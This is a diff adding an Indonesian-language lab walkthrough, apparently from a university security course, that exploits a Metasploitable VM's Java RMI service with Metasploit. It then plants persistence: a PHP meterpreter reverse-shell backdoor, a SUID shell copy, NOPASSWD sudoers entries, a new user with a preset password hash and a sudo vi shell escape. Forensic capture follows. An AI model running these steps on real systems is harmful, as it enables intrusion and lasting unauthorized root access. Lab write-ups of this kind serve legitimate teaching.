@@ -50,6 +50,293 @@
 
 ## Uji Penetrasi Metasploit
 
+### Exploit Java RMI Server
+
+#### Scan Target dengan NMAP
+1. Jalankan Intense NMAP Scan pada VM Metasploitable
+Pada terminal masukkan`nmap -p 1-65535 -T4 -A -v 192.168.56.102 2>&1 | tee /var/tmp/scan.txt`
+`192.168.56.102` adalah IP dari VM Metasoplitable
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20nmap.png "NMAP")
+
+Untuk melihat hasil nmap. Pergi ke /var/tmp. Pada terminal masukkan
+`cd /var/tmp`
+`grep -i rmi scan.txt`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20nmap%20grep.png "NMAP grep")
+
+#### Jalankan Exploit pada RMI Registry Server
+2. Buka msfconsole
+Pada terminal masukkan:
+`script msfconsole_rmi.txt`
+`msfconsole`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20msfconsole.png "msfconsole")
+`script` digunakan untuk membuat typescript yang menyimpan semua output terminal pada file (msfconsole_rmi.txt).
+
+3. Jalankan Java RMI Server Exploit
+Pada terminal masukkan:
+`search java_rmi`
+`use exploit/multi/misc/java_rmi_server`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi.png "msfconsole Java RMI")
+
+4. Set RHOST
+Pada terminal masukkan:
+`show options`
+`set RHOST 192.168.56.102`
+Untuk mengecek RHOST masukkan `show options`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20rhost.png "msfconsole Java RMI RHOST")
+`192.168.56.102` adalah IP Metasploitable.
+
+5. Exploit
+Pada terminal masukkan `exploit` untuk menjalankan exploit Java RMI pada Metasplotable
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit.png "msfconsole Java RMI exploit")
+
+6. Cek Root
+Untuk mengecek apakah kita mendapat akses root, pada terminal masukkkan:
+`ipconfig`
+`getuid`
+`sysinfo`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20got%20root.png "msfconsole Java RMI got root")
+
+#### Membuat Backdoors dan Session yang Lain
+
+7. Background Session
+Untuk menyimpan session masukkan `background`, lalu untuk melihat session masukkan `sessions -l`.
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20background.png "msfconsole background")
+
+8. Multi Handler dan Payload
+Masukkan config untuk multi handler dan paylod.
+`use exploit/multi/handler`
+`set PAYLOAD php/meterpreter/reverse_tcp`
+`show options`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20multi.png "msfconsole multi")
+
+9. Set Listening Host dan Port Multi Handler
+Masukkan IP dari host:
+`ifconfig`
+`set LHOST 192.168.56.101`
+`set LPORT 1099`
+`set ExitOnSession false`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20multi%20set.png "msfconsole multi set")
+
+10. Background Job
+Jalankan handler sebagai handler job. Masukkan:
+`exploit -j`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20background%20job.png "msfconsole handler job")
+
+11. Set PHP Backdoor
+Untuk memuat backdoor PHP, masukkan:
+`use payload/php/meterpreter/reverse_tcp`
+`show options`
+`set LHOST 192.168.1.111`
+`set LPORT 1099`
+`show options`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20php%20backdoor.png "msfconsole php backdoor")
+
+12. Generate PHP Backdoor
+Untuk men-generate backdoor, masukkan:
+`generate -t raw -f backdoor.php`
+`pwd`
+`ls -l backdoor.php`
+`head -2 backdoor.php`
+`tail -2 backdoor.php`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20background%20job%20php.png "msfconsole generate backdoor")
+
+13. Enable PHP Backdoor
+Hapus tag comment pada backdoor, masukkan:
+`sed -i 's:*<?php:<?php:' backdoor.php`
+`sed -i 's:/<?php:<?php:' backdoor.php`
+`head -1 backdoor.php`
+`echo "?>" >> backdoor.php`
+`tail -3 backdoor.php`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20php%20backdoor%20sed.png "msfconsole generate backdoor sed")
+
+14. Masuk ke java_rmi Meterpreter Session
+Untuk masuk ke Session java RMI, masukkan:
+`sessions -l`
+`sessions -i 1`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter.png "msfconsole meterptreter")
+
+15. Basic Web Server Interrogation
+Untuk membuat shell, masukkan:
+`shell`
+`ps -eaf | egrep '(http|apache)' | grep -v grep`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20web%20interro.png "msfconsole meterptreter web interro")
+Dapat dilihat bahwa terdapat Apache2 sebagai Web Server.
+
+16. Mendapatkan Apache Root Directory
+`ls -l /etc | grep release`
+`cat /etc/lsb-release` digunakan untuk melihat jenis Linux
+`cd /var/www`
+`ls -l`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20locate%20apache%20root.png "msfconsole meterptreter locate apache root")
+
+17. Membuat Backdoor SUID
+`which sh` untuk mencari path dari shell
+`cp `which sh` .backdoor` copy file command interpreter shell
+`ls -l .backdoor`
+`chmod 4777 .backdoor` agar user dari www-data dapat mengakses root
+`ls -l .backdoor`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20backdoor.png "msfconsole meterptreter suid backdoor")
+
+18. Membuat Backdoor SUDO
+`ps -eaf | grep apache2`
+`ls -l /etc/sudoers`
+`echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers` agar kita tidak perlu memasukkan password ketika melakukan perintah sudo
+`grep "www-data" /etc/sudoers`
+`exit`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20sudo%20backdoor.png "msfconsole meterptreter sudo backdoor")
+
+19. Upload Backdoor PHP
+Untuk mengupload backdoor php, masukkan:
+`pwd`
+`cd /var/www`
+`upload backdoor.php .`
+`ls`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20meterpreter%20upload%20php%20backdoor.png "msfconsole meterptreter upload php backdoor")
+
+#### Membuat Session Kedua
+
+20. Aktifkan PHP Backdoor
+Pada msfconsole masukkan:
+`background`
+Setelah itu buka browser dan akses backdoor di `http://192.168.56.102/backsdoor.php`
+Lalu lihat session yang terbuka: `sessions -l`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20active%20sessions.png "msfconsole active session")
+
+21. Interaksi dengan PHP Session
+`sessions -l`
+`sessions -i 3` digunakan untuk mengakses php session (id 3)
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20interact%20php%20sessions.png "msfconsole interact php session")
+
+#### Implementasi Backdoor SUID
+22. Mendapatkan root dari SUID
+Pada meterpreter masukkan:
+`shell`
+`pwd`
+`./.backdoor`
+`id`
+`./.backdoor -p`
+`id`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20backdoor%20implement.png "meterpreter suid imple")
+
+23. Membuat User dan Menambahkannya ke grup SUDOERS
+`/usr/sbin/useradd -m -d /home/burung -c "Burung" -s /bin/bash burung`
+`grep hackingdo /etc/passwd`
+`grep hackingdo /etc/shadow`
+`sed -i 's/:!:/:$1$e4y.VI4o$ZT1dIDHhNMtaGS2xKAaQ90:/' /etc/shadow password = abc123`
+`grep burung /etc/shadow`
+`echo "burung ALL=NOPASSWD: ALL" >> /etc/sudoers`
+`grep "burung" /etc/sudoers`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20meterpreter%20create%20user.png
+ "meterpreter suid imple create user")
+ 
+24. Mengetes Backdoor SUID
+`exit` untuk keluar dari privileged shell
+`exit` untuk keluar dari non-privileged shell
+`exit` untuk keluar dari shell
+`exit` untuk keluar dari session meterpreter PHP
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20testing%20suid%20backdoor.png
+ "meterpreter suid imple testing")
+
+#### Implementasi Backdoor Sudo #1
+
+25. Menghubungkan Kembali PHP Meterpreter Session dengan SUDO Exploit #1
+Pada msfconsole masukkan:
+`sessions -l`
+Setelah itu buka browser dan akses backdoor di `http://192.168.56.102/backsdoor.php`
+Lalu lihat session yang terbuka: `sessions -l`
+`sessions -i 5` digunakan untuk mengakses session php (id 5)
+Setelah itu pada meterpreter masukkan:
+`shell`
+`id`
+`sudo su -`
+`id`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20sudo%20backdoor%20implement.png
+ "meterpreter sudo imple")
+
+26. Keluar dari meterpreter
+`id`
+`exit` keluar dari `sudo su`
+`id`
+`exit` keluar dari shell
+`exit` keluar dari PHP session
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20sudo%20backdoor%20implement%20exit.png
+ "meterpreter sudo imple exit")
+
+
+#### Menggunakan SUDO VI Exploit
+27. Menghubungkan Kembali PHP Meterpreter Session
+Pada msfconsole masukkan:
+`sessions -l`
+Setelah itu buka browser dan akses backdoor di `http://192.168.56.102/backsdoor.php`
+Lalu lihat session yang terbuka: `sessions -l`
+`sessions -i 6` digunakan untuk mengakses session php (id 6)
+Setelah itu pada meterpreter masukkan:
+`shell`
+`id`
+`sudo vi t.txt 2>/dev/null`
+`Tekan <Enter>`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20implement%20vi.png
+ "meterpreter vi imple")
+ 
+28. VI SUDO Exploit
+Pada vim, masukkan:
+`:!/bin/sh`
+`Tekan <Enter>`
+`Tekan <Enter>`
+`id`
+`exit`
+`Tekan <Enter>`
+`:q!`
+`Tekan <Enter>`
+`id`
+`exit`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20meterpreter%20suid%20backdoor%20implement%20exit.png "meterpreter vi imple exit")
+ 
+#### Mengumpulkan Forensics Capture
+29. Menghubungkan Kembali PHP Meterpreter Session
+Sama seperti langkah 27. Hubungkan kembali PHP Session
+
+30. Membuat Direktori Forensik
+Pada terminal masukkan:
+`ssh burung@192.168.56.102`
+`password: abc123`
+`sudo su -`
+`mkdir -p /var/www/rmi`
+`chown www-data:www-data /var/www/rmi`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20forensic%20dir.png "forensic dir")
+
+31. Membuat Lime Memory Dump dan Capture Basic Forensics Artifacts
+`cd /var/tmp/src`
+`insmod ./lime-2.6.24-16-server.ko "path=/var/www/rmi/rmi.lime format=lime"`
+`netstat -nao > /var/www/rmi/rmi.netstat.txt`
+`lsof > /var/www/rmi/rmi.lsof.txt`
+`ps -eaf > /var/www/rmi/rmi.pseaf.txt`
+`ls -l /var/www/rmi/`
+`exit`
+`exit`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20forensic.png "forensic")
+
+32. Mengambil Basic Forensics Artifacts
+`mkdir -p /forensics`
+`cd /forensics`
+`wget -r -nH -np -R index.html* "http://192.168.1.106/rmi/"`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exploit%20forensic%20collect.png "forensic collect")
+
+33. Keluar Meterpreter, msfconsole dan script
+Pada msfconsole masukkan:
+`exit -y`
+`exit -y`
+`exit`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20exit%20msfconsole.png "exit msfconsole")
+
+34. Proof of Lab
+Pada terminal masukkan:
+`grep "meterpreter" msfconsole_rmi.txt | egrep '(4444|1099)' | sort | uniq`
+`grep "ESTABLISHED" /forensics/rmi/rmi.netstat.txt`
+`grep "metasploit" /forensics/rmi/rmi.pseaf.txt`
+`date`
+![alt text](https://github.com/HerdiantoNaufal/PKSJ_Kel6/blob/master/Gambar/exploit%20java%20rmi%20proof.png "proof")
+
 ### Exploit vsftpd_234_backdoor
 
 1. Masuk ke metasploit console dengan cara mengetikkan perintah: `msfconsole`
